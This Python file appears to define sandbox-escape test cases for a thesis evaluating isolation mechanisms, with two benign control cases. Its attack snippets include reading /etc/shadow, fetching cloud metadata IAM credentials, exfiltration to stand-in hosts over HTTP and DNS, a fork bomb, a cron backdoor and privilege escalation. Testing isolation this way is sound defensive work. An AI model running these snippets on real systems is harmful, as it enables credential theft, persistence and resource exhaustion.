"""Definicije testnih slucajeva S1-S5.

Scenariji su izvedeni iz vektora napada opisanih u potpoglavlju 2.2.2 rada:

  S1 - pokusaj bijega iz izolacije (sistemski pozivi, ovlasti, imenski prostori)
  S2 - pristup datotecnom sustavu domacina (citanje i pisanje izvan sandboxa)
  S3 - mrezna eksfiltracija i pristup metapodatkovnoj usluzi (169.254.169.254)
  S4 - iscrpljivanje resursa (memorija, procesi, procesorsko vrijeme)
  S5 - perzistencija i lateralno kretanje

Bodovanje se temelji na sentinelu: svaka skripta ispisuje niz "__ATTACK_OK__"
na standardni izlaz iskljucivo ako napad STVARNO postigne svoj cilj (npr. procita
tudju datoteku, poveze se van, ucita modul jezgre). Ako mehanizam izolacije
sprijeci napad, skripta do tog ispisa ne dode - bilo zato sto poziv vrati gresku,
bilo zato sto podigne iznimku. Time se izbjegava pogresno biljezenje blokiranog
napada kao uspjesnog: napad se smatra sprijecenim ako sentinel izostane.

Polje "expected_mechanism" navodi mehanizam za koji se ocekuje da ce napad
zaustaviti; sluzi za odgovor na IP2 i usporeduje se sa stvarno zabiljezenim.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import List, Optional

SENTINEL = "__ATTACK_OK__"


@dataclass(frozen=True)
class AttackCase:
    id: str
    scenario: str
    title: str
    code: str
    expect_blocked: bool
    expected_mechanism: Optional[str]
    note: str = ""


CASES: List[AttackCase] = [
    # ---------------------------------------------------------------- S1
    AttackCase(
        id="S1-01", scenario="S1", title="Ucitavanje modula jezgre",
        code=(
            "import ctypes, os\n"
            "libc = ctypes.CDLL(None, use_errno=True)\n"
            "res = libc.syscall(175, 0, 0, 0)   # init_module\n"
            "if res != 0:\n"
            "    e = ctypes.get_errno()\n"
            "    raise OSError(e, os.strerror(e))\n"
            "print('__ATTACK_OK__ modul ucitan')\n"
        ),
        expect_blocked=True, expected_mechanism="seccomp",
    ),
    AttackCase(
        id="S1-02", scenario="S1", title="unshare novog imenskog prostora",
        code=(
            "import ctypes, os\n"
            "libc = ctypes.CDLL(None, use_errno=True)\n"
            "res = libc.unshare(0x10000000)   # CLONE_NEWUSER\n"
            "if res != 0:\n"
            "    e = ctypes.get_errno()\n"
            "    raise OSError(e, os.strerror(e))\n"
            "print('__ATTACK_OK__ novi user namespace')\n"
        ),
        expect_blocked=True, expected_mechanism="seccomp",
    ),
    AttackCase(
        id="S1-03", scenario="S1", title="montiranje datotecnog sustava",
        code=(
            "import ctypes, os\n"
            "libc = ctypes.CDLL(None, use_errno=True)\n"
            "res = libc.mount(b'proc', b'/mnt', b'proc', 0, 0)\n"
            "if res != 0:\n"
            "    e = ctypes.get_errno()\n"
            "    raise OSError(e, os.strerror(e))\n"
            "print('__ATTACK_OK__ montirano')\n"
        ),
        expect_blocked=True, expected_mechanism="seccomp",
    ),
    AttackCase(
        id="S1-04", scenario="S1", title="ptrace nad drugim procesom",
        code=(
            "import ctypes, os\n"
            "libc = ctypes.CDLL(None, use_errno=True)\n"
            "res = libc.ptrace(16, 1, 0, 0)   # PTRACE_ATTACH na PID 1\n"
            "if res != 0:\n"
            "    e = ctypes.get_errno()\n"
            "    raise OSError(e, os.strerror(e))\n"
            "print('__ATTACK_OK__ ptrace uspio')\n"
        ),
        expect_blocked=True, expected_mechanism="seccomp",
    ),
    AttackCase(
        id="S1-05", scenario="S1", title="upis u release_agent (CVE-2022-0492)",
        code=(
            "open('/sys/fs/cgroup/x/release_agent','w').write('/tmp/x')\n"
            "print('__ATTACK_OK__ release_agent zapisan')\n"
        ),
        expect_blocked=True, expected_mechanism="capabilities",
    ),
    # ---------------------------------------------------------------- S2
    AttackCase(
        id="S2-01", scenario="S2", title="citanje /etc/shadow domacina",
        code=(
            "data = open('/etc/shadow').read()\n"
            "print('__ATTACK_OK__ procitano', len(data), 'bajtova')\n"
        ),
        expect_blocked=True, expected_mechanism="capabilities",
    ),
    AttackCase(
        id="S2-02", scenario="S2", title="pisanje u /usr/bin (rootfs)",
        code=(
            "open('/usr/bin/evil','w').write('#!/bin/sh\\n')\n"
            "print('__ATTACK_OK__ zapisano na rootfs')\n"
        ),
        expect_blocked=True, expected_mechanism="read_only_fs",
    ),
    AttackCase(
        id="S2-03", scenario="S2", title="izlazak iz /tmp putanjom u /etc",
        code=(
            "open('/tmp/../etc/passwd','a').write('x')\n"
            "print('__ATTACK_OK__ izmijenjen /etc/passwd')\n"
        ),
        expect_blocked=True, expected_mechanism="read_only_fs",
    ),
    AttackCase(
        id="S2-04", scenario="S2", title="pristup docker socketu domacina",
        code=(
            "import socket\n"
            "s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n"
            "s.connect('/var/run/docker.sock')\n"
            "print('__ATTACK_OK__ spojen na docker.sock')\n"
        ),
        expect_blocked=True, expected_mechanism="namespace",
        note="socket ne smije biti montiran u okruzenje; ocekuje se FileNotFound",
    ),
    # ---------------------------------------------------------------- S3
    AttackCase(
        id="S3-01", scenario="S3", title="dohvat IAM vjerodajnica s metapodataka",
        code=(
            "import urllib.request\n"
            "url='http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n"
            "d=urllib.request.urlopen(url, timeout=3).read()\n"
            "print('__ATTACK_OK__ vjerodajnice', len(d))\n"
        ),
        expect_blocked=True, expected_mechanism="network_policy",
        note="najvazniji test: uspjeh znaci krada vjerodajnica racuna u oblaku",
    ),
    AttackCase(
        id="S3-02", scenario="S3", title="eksfiltracija na vanjski posluzitelj",
        code=(
            "import urllib.request\n"
            "urllib.request.urlopen('http://example.com/?d=tajna', timeout=3)\n"
            "print('__ATTACK_OK__ podaci poslani')\n"
        ),
        expect_blocked=True, expected_mechanism="network_policy",
    ),
    AttackCase(
        id="S3-03", scenario="S3", title="DNS eksfiltracija",
        code=(
            "import socket\n"
            "socket.gethostbyname('tajna.napadac.example')\n"
            "print('__ATTACK_OK__ DNS rijesen')\n"
        ),
        expect_blocked=True, expected_mechanism="network_policy",
    ),
    AttackCase(
        id="S3-04", scenario="S3", title="skeniranje unutarnje mreze (lateralno)",
        code=(
            "import socket\n"
            "s=socket.socket(); s.settimeout(2)\n"
            "s.connect(('10.0.0.1', 22))\n"
            "print('__ATTACK_OK__ otvoren unutarnji port')\n"
        ),
        expect_blocked=True, expected_mechanism="network_policy",
    ),
    # ---------------------------------------------------------------- S4
    AttackCase(
        id="S4-01", scenario="S4", title="iscrpljivanje memorije",
        code=(
            "blob = bytearray()\n"
            "while len(blob) < 2_000_000_000:\n"
            "    blob.extend(b'x' * (10 * 1024 * 1024))\n"
            "print('__ATTACK_OK__ zauzeto 2 GB')\n"
        ),
        expect_blocked=True, expected_mechanism="cgroups_memory",
    ),
    AttackCase(
        id="S4-02", scenario="S4", title="fork bomba",
        code=(
            "import os\n"
            "n = 0\n"
            "for _ in range(10000):\n"
            "    try:\n"
            "        if os.fork() == 0:\n"
            "            os._exit(0)\n"
            "        n += 1\n"
            "    except OSError:\n"
            "        raise SystemExit('fork ogranicen')\n"
            "print('__ATTACK_OK__ forkano', n)\n"
        ),
        expect_blocked=True, expected_mechanism="cgroups_pids",
    ),
    AttackCase(
        id="S4-03", scenario="S4", title="beskonacna petlja (procesorsko vrijeme)",
        code=(
            "x = 0\n"
            "while True:\n"
            "    x += 1\n"
            "print('__ATTACK_OK__')\n"  # nedostizno: prekida ga timeout
        ),
        expect_blocked=True, expected_mechanism="timeout",
    ),
    AttackCase(
        id="S4-04", scenario="S4", title="popunjavanje diska domacina preko /tmp",
        code=(
            "import shutil\n"
            "before = shutil.disk_usage('/tmp').free\n"
            "buf = b'x' * (10*1024*1024)\n"
            "with open('/tmp/fill','wb') as f:\n"
            "    for _ in range(100000):\n"
            "        f.write(buf)\n"
            "print('__ATTACK_OK__ zapisano', before)\n"
        ),
        expect_blocked=True, expected_mechanism="cgroups_memory",
        note="/tmp je tmpfs ogranicene velicine; punjenje ne pogada disk domacina",
    ),
    # ---------------------------------------------------------------- S5
    AttackCase(
        id="S5-01", scenario="S5", title="perzistencija preko cron zapisa",
        code=(
            "open('/etc/cron.d/backdoor','w').write('* * * * * root sh -c :\\n')\n"
            "print('__ATTACK_OK__ cron postavljen')\n"
        ),
        expect_blocked=True, expected_mechanism="read_only_fs",
    ),
    AttackCase(
        id="S5-02", scenario="S5", title="podizanje ovlasti preko setuid(0)",
        code=(
            "import os\n"
            "os.setuid(0)\n"
            "if os.getuid() == 0:\n"
            "    print('__ATTACK_OK__ postao root')\n"
        ),
        expect_blocked=True, expected_mechanism="capabilities",
    ),
    AttackCase(
        id="S5-03", scenario="S5", title="upis izvrsne datoteke za perzistenciju",
        code=(
            "import os\n"
            "p='/usr/local/bin/backdoor'\n"
            "open(p,'w').write('#!/bin/sh\\necho pwned\\n')\n"
            "os.chmod(p, 0o755)\n"
            "print('__ATTACK_OK__ backdoor upisan i izvrsan')\n"
        ),
        expect_blocked=True, expected_mechanism="read_only_fs",
    ),
    # ---------------------------------------------------------- kontrola
    AttackCase(
        id="C-01", scenario="C", title="dobrocudan racunski zadatak",
        code=("print(sum(i*i for i in range(1000)))\n"),
        expect_blocked=False, expected_mechanism="none",
        note="kontrolni slucaj: mora se izvrsiti do kraja u svakoj konfiguraciji",
    ),
    AttackCase(
        id="C-02", scenario="C", title="dobrocudan zapis u /tmp",
        code=(
            "open('/tmp/rezultat.txt','w').write('ok')\n"
            "print(open('/tmp/rezultat.txt').read())\n"
        ),
        expect_blocked=False, expected_mechanism="none",
        note="zapis u tmpfs mora biti dopusten; provjera da izolacija nije prestroga",
    ),
]


def by_scenario() -> dict:
    out: dict = {}
    for c in CASES:
        out.setdefault(c.scenario, []).append(c)
    return out
